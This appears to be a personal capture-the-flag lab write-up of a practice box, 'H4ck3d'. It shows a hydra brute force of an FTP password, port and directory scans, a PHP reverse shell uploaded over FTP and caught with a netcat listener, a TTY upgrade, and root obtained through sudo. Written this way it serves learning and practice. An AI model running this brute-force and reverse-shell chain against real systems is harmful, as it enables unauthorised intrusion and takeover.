# Box Name

## H4ck3d

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# Wireshark
- ### Downloaded the pcap file in Task 1

### Digging through the pcap file find attacker brute forced ftp login
![[Pasted image 20230201134355.png]]

# FTP
- ### hacker changed users ftp password
```bash
hydra -l jenny -P ~/rockyou.txt ftp://10.10.132.230
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-01 13:50:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.132.230:21/
[21][ftp] host: 10.10.132.230   login: 'jenny'   password: '987654321'
```

- ### ftp login

```bash
ftp 10.10.132.230
Connected to 10.10.132.230.
220 Hello FTP World!
Name (10.10.132.230:scott): jenny
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||32533|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
```


# Rustscan
```bash
rustscan -r 1-65535 -a 10.10.132.230 --ulimit 5000  -- -sCV -oN nmap/h4ck3d
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.132.230:21
Open 10.10.132.230:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

# Ferox
```bash
ferox -u http://10.10.132.230 -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 403  -x php,txt -t 10 -o logs/h4ck3d

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.132.230
 🚀  Threads               │ 10
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/h4ck3d
 💲  Extensions            │ [php, txt]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
[#>------------------] - 19m    63477/661635  54/s    http://10.10.132.230
```
---
## Initial Foothold
---
# FTP
- ### Uploaded my own [[revshell]] to ftp
```bash
ftp> put rev.php
local: rev.php remote: rev.php
229 Entering Extended Passive Mode (|||16792|)
150 Ok to send data.
100% |***********|  3461       35.11 MiB/s    00:00 ETA
226 Transfer complete.
3461 bytes sent in 00:00 (9.07 KiB/s)
tp> ls -a
229 Entering Extended Passive Mode (|||61929|)
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Feb 01 20:03 .
drwxr-xr-x    3 0        0            4096 Feb 01  2021 ..
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rw-------    1 1000     1000         3461 Feb 01 20:03 rev.php
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
ftp> chmod 777 rev.php
200 SITE CHMOD command ok.
```
- ### executed the reverse shell from the web page
![[Pasted image 20230201141331.png]]

### upgraded to a full tty shell
```bash
 nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.13.0.199] from (UNKNOWN) [10.10.132.230] 59496
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:10:40 up 36 min,  0 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can\'t access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@wir3:/$ export TERM=xterm
export TERM=xterm
www-data@wir3:/$ ^Z
zsh: suspended  nc -lnvp 1234
                                                                                                                                                                                
┌──(kn1ght㉿Kali)-[~/THM/h4ck3d]
└─$ stty raw -echo; fg       
[1]  + continued  nc -lnvp 1234

www-data@wir3:/$ stty rows 60 cols 235
www-data@wir3:/$ 
```
---
## Privilege Escalation

# Path to root
```bash
www-data@wir3:/home/jenny$ su jenny
Password: 
jenny@wir3:~$ id
uid=1000(jenny) gid=1000(jenny) groups=1000(jenny),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
jenny@wir3:~$ sudo -l
[sudo] password for jenny: 
Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:~$ sudo su 
root@wir3:/home/jenny# id
uid=0(root) gid=0(root) groups=0(root)
root@wir3:/home/jenny# 
```
----
